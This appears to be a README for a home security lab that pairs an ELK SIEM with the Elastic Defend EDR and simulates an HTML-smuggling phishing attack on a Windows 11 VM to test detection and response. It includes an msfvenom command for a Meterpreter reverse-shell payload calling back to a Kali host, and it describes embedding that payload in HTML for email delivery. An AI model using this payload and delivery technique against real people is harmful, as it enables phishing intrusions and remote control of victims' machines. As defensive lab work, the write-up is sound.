# ELK Stack & Elastic Defender EDR

## Overview
This project documents the implementation of a detection engineering home lab centered around a central ELK Stack SIEM and a Windows 11 endpoint monitored by the Elastic Defend agent. The objective was to emulate a real-world phishing attack using HTML smuggling to bypass network perimeters, deliver a stageless reverse TCP payload, and validate the endpoint's automated defensive and incident response capabilities.

## Lab Goals
- Deploy a comprehensive SIEM solution for endpoints on my homelab network.
- Be able to methodically plan and execute an attack scenario. (HTML Smuggling)
- Utilize endpoint and attack data inside of Elasticsearch to create custom query rules to report or block actions from occuring.

## Lab Architecture & Initialization

    SIEM / Analytics: ELK Stack deployed via Docker to ingest endpoint telemetry and manage alerts.

    Target Endpoint: Windows 11 Enterprise VM executing simulated adversary behaviors.

    Endpoint Security: Elastic Agent running Elastic Defend (EDR) in prevention mode.

    Attacker Infrastructure: Kali Linux box used to craft the malicious payload.

SIEM Deployment:
The core ELK infrastructure was spun up via a standardized containerized deployment:
Bash

## Initializing the ELK SIEM environment
docker-compose up -d

(Screenshot Placeholder: Docker Compose terminal output / Container status)

EDR Deployment:
The Windows 11 endpoint was instrumented by deploying the Elastic Agent and enrolling it into the Fleet server with the Elastic Defend integration applied.
PowerShell

## Installing and enrolling the Elastic Agent on the Windows 11 endpoint
.\elastic-agent.exe install --url=https://<Fleet_Server_IP>:8220 --enrollment-token=<Enrollment_Token> --insecure

(Screenshot Placeholder: PowerShell Elastic Agent successful installation)
Phase 1: Payload Crafting & Phishing Delivery

To bypass standard network-layer controls, an HTML smuggling vector was utilized to deliver a weaponized executable.

1. Generating the Payload:
A stageless Windows x64 Meterpreter reverse TCP payload was generated using msfvenom.
Bash

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o payload.exe

2. Assembling the Smuggling Document:
The binary was converted into a Base64 string and embedded inside a client-side JavaScript block within T1027_006_smuggling.html.
Bash

base64 -w 0 payload.exe > base64_exe.txt

(Screenshot Placeholder: HTML code snippet showing the Base64 variable and Blob assembly)

3. Delivery Mechanism:
The weaponized HTML file was emailed directly to the target endpoint to simulate a realistic phishing campaign.
Phase 2: Execution & Network Evasion

The attack relied on the endpoint's browser to build the malware locally, rendering network firewalls and email gateways blind since the file was never transferred as a compiled executable.
Plaintext

[ Email Inbox ] ---> ( Encoded HTML Attachment ) ---> [ Perimeter/Email Gateway ] (Allowed: Read as benign text)
                                                              |
                                                              v
[ Windows 11 Browser Memory ] <--- ( JavaScript Blob Assembly ) <-- [ Dropped payload.exe ]

When the user opened the phishing attachment, the embedded script utilized a JavaScript Blob array to reassemble the Meterpreter binary directly inside browser memory before forcing a localized disk write.
Phase 3: EDR Detection & Incident Response

The moment the browser completed the memory compilation and dropped the file to disk, the endpoint controls intervened, moving the workflow from detection to active incident response.
Automated Prevention

Elastic Defend’s behavioral and static analysis engines identified the Meterpreter payload immediately upon the disk write event, automatically quarantining the executable before it could execute or establish the reverse shell connection back to the Kali listener.
Case Management & Triage

Within the Kibana Security application, multiple telemetry triggers fired simultaneously. To organize the incident response effort, four distinct EDR malware alerts were aggregated and escalated into a single unified Case. This demonstrates the ability to track an incident from initial triage through to remediation tracking.
(Screenshot Placeholder: Kibana Security Cases tab showing the grouped alerts)
Execution Pipeline Analysis (Attack Map)

To perform root cause analysis, I utilized Elastic's Analyzer / Process Tree (Attack Map) view. This visual timeline perfectly mapped the execution pipeline, explicitly showing:

    The parent browser process (msedge.exe).

    The file modification event writing the anomalous executable to the file system.

    The Elastic Defend engine intercepting the execution chain and terminating the threat.

(Screenshot Placeholder: Elastic Security Analyzer visual process tree/attack map)

## Key Takeaways

    Network Blindness: Network signatures and standard email gateways are highly ineffective against application-layer obfuscation like HTML smuggling. Initial access validation must happen at the endpoint layer.

    The Value of EDR: Automated prevention controls are critical. Coupling a SIEM with an active EDR ensures that stageless payloads bypassing the perimeter are neutralized at the disk level, significantly reducing the Mean Time to Respond (MTTR).

    Streamlined Incident Response: Leveraging SIEM Case Management and visual Process Analyzers allows detection engineers and analysts to rapidly track a threat's origin (the browser) rather than just reacting to the isolated file drop.




